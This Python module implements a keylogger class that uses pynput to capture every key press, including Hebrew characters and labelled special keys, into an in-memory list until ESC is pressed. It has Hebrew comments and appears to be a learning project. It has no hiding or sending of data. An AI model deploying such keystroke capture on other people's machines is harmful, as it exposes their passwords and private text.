from pynput import keyboard
from typing import List
from IKeyLogger import IKeyLogger

class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.logged_keys: List[str] = []
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)

    def on_press(self, key):
        """פונקציה שמופעלת בכל פעם שנלחץ מקש"""
        try:
            self.logged_keys.append(str(key.char))  # אותיות רגילות, כולל עברית
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: "BACKSPACE",
                keyboard.Key.shift: "SHIFT",
                keyboard.Key.ctrl_l: "CTRL_L",
                keyboard.Key.ctrl_r: "CTRL_R",
                keyboard.Key.alt_l: "ALT_L",
                keyboard.Key.alt_r: "ALT_R",
                keyboard.Key.tab: "TAB",
                keyboard.Key.esc: "ESCAPE"
            }
            self.logged_keys.append(special_keys.get(key, str(key)))  # תרגום מקשים מיוחדים

    def on_release(self, key):
        """עוצר את ההאזנה אם המשתמש לוחץ על ESC"""
        if key == keyboard.Key.esc:
            return False  # מפסיק את ההאזנה

    def start_logging(self):
        """מתחיל להאזין להקלדות"""
        self.listener.start()
        self.listener.join()

    def stop_logging(self):
        """עוצר את ההאזנה להקלדות"""
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        """מחזיר את רשימת ההקלדות שנאספו"""
        return self.logged_keys